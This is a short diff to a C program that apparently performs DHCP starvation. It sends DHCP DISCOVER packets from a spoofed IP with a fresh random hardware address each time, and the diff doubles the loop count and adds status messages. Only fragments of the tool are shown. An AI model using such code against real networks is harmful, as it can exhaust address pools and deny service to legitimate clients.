@@ -282,7 +282,7 @@ int send_DHCP_discover_packet(int sock) {
     discover_packet.hlen = H_LEN;
     discover_packet.hops = 0;
 
-    transaction_id = random();
+    transaction_id++;
     discover_packet.xid = htonl(transaction_id);
     discover_packet.secs = htons(0x00);
     discover_packet.flags = htons(BROADCAST_FLAG);
@@ -301,6 +301,8 @@ int send_DHCP_discover_packet(int sock) {
     while (send_packet(&discover_packet, sizeof(discover_packet), sock, spoofed_ip, &broadcast_address) == FAILURE) {
         printf("Error in sending packet... resending the packet\n");
     }
+
+    printf("Sending DHCP_DISCOVER packet\n");
 
     return SUCCESS;
 }
@@ -389,6 +391,7 @@ int get_DHCP_offer_packet(int sock, struct sockaddr_in *source) {
         return SUCCESS;
     }
 
+    printf("No DHCP_OFFER received\n");
     return FAILURE;
 }
 
@@ -414,7 +417,7 @@ int main(int argc, char *argv[]) {
     struct sockaddr_in source;
 
     int sock = create_socket(interface_name);
-    for (int i = 0; i < 15; i++) {
+    for (int i = 0; i < 30; i++) {
         make_random_hardware_address();
         send_DHCP_discover_packet(sock);
         fflush(stdout);
